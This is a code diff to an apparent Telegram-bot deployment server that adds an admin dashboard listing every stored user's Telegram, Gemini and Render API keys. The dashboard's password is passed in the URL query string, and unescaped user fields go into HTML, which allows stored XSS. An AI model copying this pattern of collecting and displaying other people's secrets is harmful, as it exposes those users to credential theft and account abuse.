@@ -223,36 +223,175 @@ async function saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey) 
     }
 }
 
-// Security Check Middleware or logic for /deploy
-app.get('/deploy', (req, res) => {
-    // A simple form to input password if accessed via browser, though typically this would be a POST API call from another site
-    res.send(`
-        <form method="POST" action="/deploy">
-            <input type="password" name="password" placeholder="Enter Password" required>
-            <!-- Include other fields needed for testing or assume this is just for the API endpoint -->
-            <input type="text" name="botName" placeholder="Bot Name" required>
-            <input type="text" name="telegramKey" placeholder="Telegram Key" required>
-            <input type="text" name="geminiKey" placeholder="Gemini Key" required>
-            <input type="text" name="renderKey" placeholder="Render Key" required>
-            <button type="submit">Deploy</button>
-        </form>
-    `);
+// ==========================================
+// ADMIN DASHBOARD & LOGIN
+// ==========================================
+
+app.get('/deploy', async (req, res) => {
+    const password = req.query.password;
+    const DEPLOY_PASSWORD = process.env.DEPLOY_PASSWORD;
+
+    // If no password provided, show the login form
+    if (!password) {
+        return res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Admin Login</title>
+                <style>
+                    body { background-color: #030407; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                    .login-box { background: #0b0d18; border: 1px solid #333; padding: 40px; border-radius: 10px; width: 300px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+                    h2 { margin-top: 0; color: #3b82f6; }
+                    input { width: 100%; padding: 12px; margin: 15px 0; background: #161824; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
+                    input:focus { border-color: #3b82f6; }
+                    button { width: 100%; padding: 12px; background: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; transition: background 0.3s; }
+                    button:hover { background: #2563eb; }
+                </style>
+            </head>
+            <body>
+                <div class="login-box">
+                    <h2>Admin Login</h2>
+                    <form action="/deploy" method="GET">
+                        <input type="password" name="password" placeholder="Enter Secure Password" required>
+                        <button type="submit">Unlock Dashboard</button>
+                    </form>
+                </div>
+            </body>
+            </html>
+        `);
+    }
+
+    if (!DEPLOY_PASSWORD) {
+        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px;'>Admin password not configured in Environment Variables!</h2>");
+    }
+
+    if (password !== DEPLOY_PASSWORD) {
+        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px;'>Incorrect Password! <br><br><a href='/deploy' style='color:#3b82f6;'>Try again</a></h2>");
+    }
+
+    // Password is correct, fetch data from GitHub
+    const GITHUB_PAT = process.env.GITHUB_PAT;
+    if (!GITHUB_PAT) {
+        return res.send("<h2 style='color:red; text-align:center; padding-top: 50px;'>GITHUB_PAT is missing! Cannot fetch data.</h2>");
+    }
+
+    try {
+        const userRes = await axios.get('https://api.github.com/user', {
+            headers: { 'Authorization': `token ${GITHUB_PAT}` }
+        });
+        const repoOwner = userRes.data.login;
+        const repoName = 'Bot-Users-Data';
+        const filePath = 'users.json';
+
+        const fileRes = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+            headers: { 'Authorization': `token ${GITHUB_PAT}` }
+        });
+
+        const decodedContent = Buffer.from(fileRes.data.content, 'base64').toString('utf-8');
+        const usersData = JSON.parse(decodedContent);
+
+        if (!Array.isArray(usersData) || usersData.length === 0) {
+            return res.send(`
+                <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
+                    <div style="display: flex; justify-content: space-between; padding: 0 50px; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px;">
+                        <h1 style="color: #60a5fa; margin: 0;">🔐 Admin Dashboard</h1>
+                        <a href="/deploy" style="background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-weight: bold;">Logout</a>
+                    </div>
+                    <h2 style='margin-top: 50px;'>No user data found yet.</h2>
+                </div>
+            `);
+        }
+
+        let tableRows = usersData.map((user, index) => `
+            <tr>
+                <td>${index + 1}</td>
+                <td>${user.botName}</td>
+                <td><input type="text" value="${user.telegramKey}" readonly onclick="this.select();" style="background:transparent; color:#4ade80; border:none; width:100%; cursor:pointer;" title="Click to copy"></td>
+                <td><input type="text" value="${user.geminiKey}" readonly onclick="this.select();" style="background:transparent; color:#60a5fa; border:none; width:100%; cursor:pointer;" title="Click to copy"></td>
+                <td><input type="password" value="${user.renderKey}" readonly onclick="this.type='text'; this.select();" onblur="this.type='password'" style="background:transparent; color:#f87171; border:none; width:100%; cursor:pointer;" title="Click to view & copy"></td>
+                <td style="color: #9ca3af; font-size: 0.9em;">${new Date(user.timestamp).toLocaleString()}</td>
+            </tr>
+        `).join('');
+
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Admin Dashboard</title>
+                <style>
+                    body { background-color: #030407; color: white; font-family: sans-serif; padding: 30px; }
+                    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
+                    h1 { color: #60a5fa; margin: 0; }
+                    .logout-btn { background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-weight: bold; }
+                    .logout-btn:hover { background: #dc2626; }
+                    .table-container { overflow-x: auto; background: #0b0d18; border-radius: 10px; border: 1px solid #333; padding: 1px; }
+                    table { width: 100%; border-collapse: collapse; }
+                    th, td { border-bottom: 1px solid #333; padding: 15px; text-align: left; }
+                    th { background-color: #161824; color: #a1a1aa; text-transform: uppercase; font-size: 0.85em; letter-spacing: 1px; }
+                    tr:last-child td { border-bottom: none; }
+                    tr:hover { background-color: #1a1c29; }
+                </style>
+            </head>
+            <body>
+                <div class="header">
+                    <h1>🔐 Admin Dashboard - API Keys</h1>
+                    <a href="/deploy" class="logout-btn">Logout</a>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Bot Name</th>
+                                <th>Telegram Key</th>
+                                <th>Gemini Key</th>
+                                <th>Render Key</th>
+                                <th>Deployed At</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${tableRows}
+                        </tbody>
+                    </table>
+                </div>
+            </body>
+            </html>
+        `);
+    } catch (error) {
+        if (error.response && error.response.status === 404) {
+            res.send(`
+                <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
+                    <div style="display: flex; justify-content: space-between; padding: 0 50px; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px;">
+                        <h1 style="color: #60a5fa; margin: 0;">🔐 Admin Dashboard</h1>
+                        <a href="/deploy" style="background: #ef4444; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-weight: bold;">Logout</a>
+                    </div>
+                    <h2 style='margin-top: 50px;'>No user data found yet. (users.json is missing)</h2>
+                </div>
+            `);
+        } else {
+            res.send(`<h2 style='color:red; text-align:center; padding-top: 50px;'>Error fetching data: ${error.message}</h2><br><center><a href='/deploy' style='color:#3b82f6;'>Go Back</a></center>`);
+        }
+    }
 });
 
-app.post('/deploy', async (req, res) => {
+// ==========================================
+// API ENDPOINT FOR EXTERNAL BOT DEPLOYMENT
+// ==========================================
+
+app.post('/api/deploy', async (req, res) => {
     const { password, botName, telegramKey, geminiKey, renderKey } = req.body;
     
     // Check password from Environment Variable
     const DEPLOY_PASSWORD = process.env.DEPLOY_PASSWORD;
     
     if (!DEPLOY_PASSWORD || password !== DEPLOY_PASSWORD) {
-        return res.status(401).send("Unauthorized: Invalid Password");
+        return res.status(401).json({ success: false, error: "Unauthorized: Invalid Password" });
     }
 
     const githubRepo = 'https://github.com/yasinffx36-afk/Aura-FFX-Savar-Ai.git';
     
     if (!botName || !telegramKey || !geminiKey || !renderKey) {
-        return res.status(400).send("All fields are required!");
+        return res.status(400).json({ success: false, error: "All fields are required!" });
     }
 
     try {
